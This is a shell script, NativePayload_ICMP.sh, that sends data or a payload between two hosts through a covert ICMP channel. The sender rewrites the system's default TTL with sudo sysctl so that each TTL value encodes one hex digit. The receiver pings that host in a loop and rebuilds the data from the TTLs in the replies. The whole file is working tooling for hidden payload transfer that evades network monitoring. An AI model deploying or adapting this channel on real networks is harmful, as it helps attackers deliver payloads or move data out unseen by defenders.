 #!/bin/sh 
payload="";
PingRequest=0;
c=1;
temp="";
tput setaf 7;
echo
echo "NativePayload_ICMP.sh Download Payload by ICMPv4 Traffic via 'TTL' ";
echo "NativePayload_ICMP v1.0 , Published by Damon Mohammadbagher 2017-2018 ";
tput setaf 9;
if [ "$1" == $'help' ] ;
then
echo
echo "step0 Client-Side with ipv4 w.x.y.z , syntax :./NativePayload_ICMP.sh shtext \"your text or string\"";
echo "step1 Server-Side with ipv4 w1.x1.y1.z1 syntax :./NativePayload_ICMP.sh listen \"w.x.y.z\"";
echo "Note: in step1 you should use Client-side system w.x.y.z IPv4Address";
echo
fi

if [ "$1" == $'shtext' ] ;
	then
#textpayload=`echo $2$'\157' | xxd -p`
textpayload=`echo -n $2 | od -A n -t x1`
ttlpayload="";
mytemp="";
echo
echo "[!] your payload Text:" $2;
echo "[!] your payload bytes:" $textpayload;
		for pay in `echo $textpayload | xxd -c 1`
		do
                case $pay in
		0)
		if [ "$mytemp" != $'0' ] ;
		then
		ttlpayload+="100"
		fi
		;; 
		1)
		if [ "$mytemp" != $'1' ] ;
		then
		ttlpayload+="101"
		fi
		;; 
		2)
		if [ "$mytemp" != $'2' ] ;
		then
		ttlpayload+="102"
		fi
		;; 
		3)
		if [ "$mytemp" != $'3' ] ;
		then
		ttlpayload+="103"
		fi
		;; 
		4)
		if [ "$mytemp" != $'4' ] ;
		then
		ttlpayload+="104"
		fi
		;; 
		5)
		if [ "$mytemp" != $'5' ] ;
		then
		ttlpayload+="105"
		fi
		;; 
		6)
		if [ "$mytemp" != $'6' ] ;
		then
		ttlpayload+="106"
		fi
		;; 
		7)
		if [ "$mytemp" != $'7' ] ;
		then
		ttlpayload+="107"
		fi
		;; 
		8)
		if [ "$mytemp" != $'8' ] ;
		then
		ttlpayload+="108"
		fi
		;; 
		9)
		if [ "$mytemp" != $'9' ] ;
		then
		ttlpayload+="109"
		fi
		;; 
		a)
		if [ "$mytemp" != $'a' ] ;
		then
		ttlpayload+="110"
		fi
		;; 
		b)
		if [ "$mytemp" != $'b' ] ;
		then
		ttlpayload+="111"
		fi
		;; 
		c)
		if [ "$mytemp" != $'c' ] ;
		then
		ttlpayload+="112"
		fi
		;; 
		d)
		if [ "$mytemp" != $'d' ] ;
		then
		ttlpayload+="113"
		fi
		;; 
		e)
		if [ "$mytemp" != $'e' ] ;
		then
		ttlpayload+="114"
		fi
		;; 
		f)
		if [ "$mytemp" != $'f' ] ;
		then
		ttlpayload+="115"
		fi
		;;
		esac 
                mytemp=$pay;
		done
#echo $ttlpayload;
mytemp2="";
Finalttlpayload="";
	for pay2 in `echo $ttlpayload | xxd -g 0 -c 3 | awk {'print $3'}`
	do
		if [ "$mytemp2" == "$pay2" ]
		then
		Finalttlpayload+="253""$pay2";
		fi
		if [ "$mytemp2" != "$pay2" ]
		then
		Finalttlpayload+=$pay2;
		fi
        mytemp2=$pay2	
	done	
	echo 

	#echo "your TTL payload:" $Finalttlpayload 

#       Finalttlpayload=`echo "${Finalttlpayload::-6}"`;
  	mylength=`echo ${#Finalttlpayload}`
        div=3;
        length=$((mylength / div));
	
	echo "[!] your TTL payload:" $Finalttlpayload;	
	tput setaf 3; 
	echo "[!] at least you need ("$length") Times to change TTL value";
	echo "[!] at least you need ("$length "* 2) Ping Request/Response";
	tput setaf 9; 
	echo "[>] Start Flag , change TTL value to '254' with sleep 5)";
	sudo sysctl net.ipv4.ip_default_ttl=254; sleep 5;
	echo "[>] Running sysctl command for change TTL values (Default sleep is 2)";
	echo	
	
	        for TTLs in `echo $Finalttlpayload | xxd -p -c 3`
		do
		string=`echo $TTLs | xxd -r -p`
			if [ "$string" != $'' ] && [ "$string" != $'.' ];
			then 
			echo "sudo sysctl net.ipv4.ip_default_ttl="$string "; sleep 2";
			sudo sysctl net.ipv4.ip_default_ttl=$string; sleep 2;
			fi
		done
		sudo sysctl net.ipv4.ip_default_ttl=255; sleep 2;
		sudo sysctl net.ipv4.ip_default_ttl=100; sleep 2;
		sudo sysctl net.ipv4.ip_default_ttl=255; sleep 2;
	fi
if [ "$1" == $'listen' ] ;
	then
while (true)
do
        Time=`date '+%d/%m/%Y %H:%M:%S'`
	((PingRequest++));

	string=`ping $2 -c 1 | grep -e ttl= | awk {'print $6'}`	 
	echo
        string=`echo $string | cut -d'=' -f2`	 
       
        case $string in 
        100)
 tput setaf 2; 
        echo "[$Time]" "Dumped Byte via TTL : 0"
	if (( $temp != 100 )) ;
	then
	payload+="0"
	fi
	;;
        101)
 tput setaf 2; 
       echo "[$Time]" "Dumped Byte via TTL : 1"
	if (( $temp != 101 ))  ;
	then
	payload+="1"
	fi
	;;
        102)
 tput setaf 2; 
       echo "[$Time]" "Dumped Byte via TTL : 2"
	if (( $temp != 102 )) ;
	then
	payload+="2"
	fi	
	;;
        103)
 tput setaf 2; 
       echo "[$Time]" "Dumped Byte via TTL : 3"
	if (( $temp != 103 ))  ;
	then
	payload+="3"
	fi
	;;
        104)
 tput setaf 2; 
       echo "[$Time]" "Dumped Byte via TTL : 4"
	if (( $temp != 104 ))  ;
	then
	payload+="4"
	fi
	;;
        105)
 tput setaf 2; 
       echo "[$Time]" "Dumped Byte via TTL : 5"
	if (( $temp != 105 ))  ;
	then
	payload+="5"
	fi
	;;
        106)
 tput setaf 2; 
       echo "[$Time]" "Dumped Byte via TTL : 6"
	if (( $temp != 106 ))  ;
	then
	payload+="6"
	fi
	;;
        107)
 tput setaf 2; 
       echo "[$Time]" "Dumped Byte via TTL : 7"
	if (( $temp != 107 ))  ;
	then
	payload+="7"
	fi
	;;
        108)
 tput setaf 2;	
       echo "[$Time]" "Dumped Byte via TTL : 8"
	if (( $temp != 108 )) ;
	then
	payload+="8"
	fi	
	;;
        109)
 tput setaf 2; 
       echo "[$Time]" "Dumped Byte via TTL : 9"
	if (( $temp != 109 ))  ;
	then
	payload+="9"
	fi
	;;
        110)
 tput setaf 2; 
       echo "[$Time]" "Dumped Byte via TTL : a"
	if (( $temp != 110 ))  ;
	then
	payload+="a"
	fi
	;;
        111)
 tput setaf 2; 
       echo "[$Time]" "Dumped Byte via TTL : b"
	if (( $temp != 111 ))  ;
	then
	payload+="b"
	fi
	;;
        112)
 tput setaf 2; 
       echo "[$Time]" "Dumped Byte via TTL : c"
	if (( $temp != 112 ))  ;
	then
	payload+="c"
	fi
	;;
        113)
 tput setaf 2; 
       echo "[$Time]" "Dumped Byte via TTL : d"
	if (( $temp != 113 ))  ;
	then
	payload+="d"
	fi
	;;
        114)
 tput setaf 2; 
       echo "[$Time]" "Dumped Byte via TTL : e"
	if (( $temp != 114 ))  ;
	then
	payload+="e"
	fi
	;;
        115)
 tput setaf 2; 
       echo "[$Time]" "Dumped Byte via TTL : f"
	if (( $temp != 115 ))  ;
	then
	payload+="f"
	fi
	;;
        255)
        tput setaf 1; 
        echo "[$Time] ," $c ":Dumped Finish Flag 'ttl 255' "        

	((c++));

        if (( $c == 15 )) ;
	then
	break
	fi
	;;
        253)
        tput setaf 3; 
        echo "[$Time] ," $c ":Dumped Double Flag 'ttl 253' "        
	;;
        esac
        
        temp=$string;

 tput setaf 9;
       echo "Ping Requests:" $PingRequest 
       echo "your Payload :"  $payload 
 tput setaf 9; 

#final=`echo $payload | xxd -r -p`

	final=`echo -n $payload | od -A n -t x1 | xxd -r -p | xxd -r -p`
	echo "your Data : " $final
	
sleep 1;
done
	fi

